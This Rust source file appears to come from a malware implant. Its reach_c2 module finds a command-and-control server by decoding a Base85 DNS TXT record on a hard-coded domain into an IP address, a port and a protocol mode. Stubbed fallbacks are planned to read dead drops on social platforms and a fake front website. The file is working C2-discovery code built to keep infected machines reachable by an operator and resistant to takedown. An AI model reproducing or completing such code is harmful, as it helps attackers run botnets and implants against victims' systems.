use std::net::Ipv4Addr;
use thiserror::Error;
use hickory_resolver::Resolver;

#[derive(Error, Debug)]
pub enum DnsReachError {
    #[error(transparent)]
    ResolveFailure(#[from] hickory_resolver::ResolveError),

    #[error("Missing DNS TXT record")]
    MissingRecord,

    #[error(transparent)]
    BadUtf8Encoding(#[from] std::str::Utf8Error),

    #[error("Cannot decode DNS TXT record as Base85")]
    BadBase85Encoding,

    #[error("DNS TXT payload len {0} too short, expected 7 bytes")]
    PayloadTooShort(usize),

    #[error("Unknown communications mode {0} from DNS payload")]
    UnknownComMode(u8),
}

#[derive(Error, Debug)]
pub enum DeadDropReachError {
    #[error("{0}")]
    Unknown(String),
}

#[derive(Error, Debug)]
pub enum WebsiteReachError {
    #[error("{0}")]
    Unknown(String),
}

#[derive(Error, Debug)]
pub enum ReachError {
    #[error(transparent)]
    DNS(#[from] DnsReachError),

    #[error(transparent)]
    DeadDrop(#[from] DeadDropReachError),

    #[error(transparent)]
    Website(#[from] WebsiteReachError),

    #[error("All reach methods failed (dns: {dns}, deaddrop: {deaddrop}, website: {website})")]
    AllMethodsFailed {
        dns: DnsReachError,
        deaddrop: DeadDropReachError,
        website: WebsiteReachError,
    },
}

pub enum ReachComMode {
    HTTP,
    UDP,
}

pub struct ReachInfo {
    pub ipv4: Ipv4Addr,
    pub port: u16,
    pub com_mode: ReachComMode,
}

pub async fn reach_c2() -> Result<ReachInfo, ReachError> {
    let dns_result = find_c2_dns().await;
    if let Ok(info) = dns_result {
        return Ok(info);
    }

    let deaddrop_result = find_c2_deaddrop().await;
    if let Ok(info) = deaddrop_result {
        return Ok(info);
    }

    let website_result = find_c2_website().await;
    if let Ok(info) = website_result {
        return Ok(info);
    }

    Err(ReachError::AllMethodsFailed {
        dns: dns_result.err().unwrap(),
        deaddrop: deaddrop_result.err().unwrap(),
        website: website_result.err().unwrap(),
    })
}

async fn find_c2_dns() -> Result<ReachInfo, DnsReachError> {
    let resolver = Resolver::builder_tokio()?.build();
    let result = resolver.txt_lookup("korf.elstadt.com").await?;

    let first_record = result.iter().next().ok_or(DnsReachError::MissingRecord)?;
    let txt_data = first_record
        .txt_data()
        .first()
        .ok_or(DnsReachError::MissingRecord)?;

    /*
        IPv4 address: 4 bytes
        Port: 2 bytes
        Comm mode: 1 byte
            -> 0x00 = http
            -> 0x01 = udp
    */
    let bytes =
        base85::decode(str::from_utf8(txt_data)?).map_err(|_| DnsReachError::BadBase85Encoding)?;
    let bytes_len = bytes.len();

    if bytes_len < 7 {
        return Err(DnsReachError::PayloadTooShort(bytes_len));
    }

    Ok(ReachInfo {
        ipv4: Ipv4Addr::new(bytes[0], bytes[1], bytes[2], bytes[3]),
        port: u16::from_be_bytes([bytes[4], bytes[5]]),
        com_mode: match bytes[6] {
            0x00 => ReachComMode::HTTP,
            0x01 => ReachComMode::UDP,
            b => return Err(DnsReachError::UnknownComMode(b)),
        },
    })
}

async fn find_c2_deaddrop() -> Result<ReachInfo, DeadDropReachError> {
    Err(DeadDropReachError::Unknown("Not implemented".into())) // todo: look inside some deaddrop: discord, yt, x or whatever
}

async fn find_c2_website() -> Result<ReachInfo, WebsiteReachError> {
    Err(WebsiteReachError::Unknown("Not implemented".into())) // todo: request to some fake front website for the reach info
}
